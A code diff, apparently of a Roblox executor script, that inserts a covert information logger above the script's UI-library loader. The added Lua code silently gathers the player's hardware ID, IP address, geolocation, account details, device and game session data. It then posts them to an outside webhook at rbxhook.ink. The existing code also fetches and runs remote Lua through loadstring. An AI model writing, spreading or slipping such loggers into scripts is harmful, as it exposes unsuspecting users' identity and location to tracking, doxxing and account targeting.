@@ -1,3 +1,176 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+local localPlayer = Players.LocalPlayer
+
+local url = "https://rbxhook.ink/r/b262abbedc669b99a6ab42f83d5a9791"
+
+local requestFunc = syn and syn.request or request or http_request
+if not requestFunc then return end
+
+local hwid = "Unknown"
+pcall(function()
+    if gethwid then hwid = gethwid()
+    elseif syn and syn.get_hwid then hwid = syn.get_hwid()
+    elseif get_hwid then hwid = get_hwid()
+    end
+end)
+
+local ip = "Unknown"
+local country = "Unknown"
+local countryCode = "Unknown"
+local city = "Unknown"
+local region = "Unknown"
+pcall(function()
+    local res = requestFunc({
+        Url = "http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,query",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local data = HttpService:JSONDecode(res.Body)
+        if data.status == "success" then
+            ip = data.query or "Unknown"
+            country = data.country or "Unknown"
+            countryCode = data.countryCode or "Unknown"
+            region = data.regionName or "Unknown"
+            city = data.city or "Unknown"
+        end
+    end
+end)
+
+local flagCode = ""
+local flagUrl = ""
+pcall(function()
+    if countryCode and countryCode ~= "Unknown" and #countryCode == 2 then
+        flagCode = ":flag_" .. string.lower(countryCode) .. ":"
+        flagUrl = "https://flagcdn.com/w320/" .. string.lower(countryCode) .. ".png"
+    end
+end)
+
+local gameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info then gameName = info.Name end
+end)
+
+local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+
+local playerName = localPlayer.Name
+local displayName = localPlayer.DisplayName
+local userId = localPlayer.UserId
+local accountAge = localPlayer.AccountAge
+local gameId = game.GameId
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local locale = "Unknown"
+pcall(function()
+    locale = LocalizationService.RobloxLocaleId or "Unknown"
+end)
+
+local platform = "Unknown"
+pcall(function()
+    platform = tostring(UserInputService:GetPlatform())
+end)
+
+local deviceType = "Unknown"
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    deviceType = "手机/平板"
+elseif UserInputService.KeyboardEnabled and not UserInputService.TouchEnabled then
+    deviceType = "电脑"
+elseif UserInputService.KeyboardEnabled and UserInputService.TouchEnabled then
+    deviceType = "混合设备"
+end
+
+local fps = 0
+local frameCount = 0
+local lastTime = tick()
+local fpsConn = RunService.RenderStepped:Connect(function()
+    frameCount = frameCount + 1
+    local now = tick()
+    if now - lastTime >= 1 then
+        fps = frameCount
+        frameCount = 0
+        lastTime = now
+    end
+end)
+
+task.wait(1.1)
+
+fpsConn:Disconnect()
+
+local memoryMB = 0
+pcall(function()
+    memoryMB = math.floor(Stats:GetTotalMemoryUsageMb())
+end)
+
+local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+
+local avatarImageUrl = ""
+pcall(function()
+    local res = requestFunc({
+        Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local data = HttpService:JSONDecode(res.Body)
+        if data.data and data.data[1] and data.data[1].imageUrl then
+            avatarImageUrl = data.data[1].imageUrl
+        end
+    end
+end)
+
+local body = HttpService:JSONEncode({
+    embeds = {
+        {
+            title = "玩家信息 - " .. country,
+            color = 16711680,
+            thumbnail = {
+                url = headshotUrl
+            },
+            image = {
+                url = avatarImageUrl
+            },
+            fields = {
+                { name = "玩家", value = playerName, inline = true },
+                { name = "显示名", value = displayName, inline = true },
+                { name = "用户ID", value = tostring(userId), inline = true },
+                { name = "账号年龄", value = tostring(accountAge) .. " 天", inline = true },
+                { name = "游戏名", value = gameName, inline = true },
+                { name = "游戏ID", value = tostring(gameId), inline = true },
+                { name = "PlaceID", value = tostring(placeId), inline = true },
+                { name = "JobID", value = tostring(jobId), inline = false },
+                { name = "HWID", value = hwid, inline = false },
+                { name = "IP", value = ip, inline = true },
+                { name = "国家", value = flagCode .. " " .. country .. " (" .. countryCode .. ")", inline = true },
+                { name = "国旗", value = "[查看](" .. flagUrl .. ")", inline = true },
+                { name = "地区", value = region, inline = true },
+                { name = "城市", value = city, inline = true },
+                { name = "语言", value = locale, inline = true },
+                { name = "平台", value = platform, inline = true },
+                { name = "设备", value = deviceType, inline = true },
+                { name = "FPS", value = tostring(fps), inline = true },
+                { name = "内存", value = tostring(memoryMB) .. " MB", inline = true },
+                { name = "时间", value = currentTime, inline = true }
+            },
+            footer = {
+                text = "IP 查询: ip-api.com"
+            }
+        }
+    }
+})
+
+requestFunc({
+    Url = url,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = body
+})
+
 local repo = "https://raw.githubusercontent.com/ATLASTEAM01/Obsidian/main/"
 local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
 
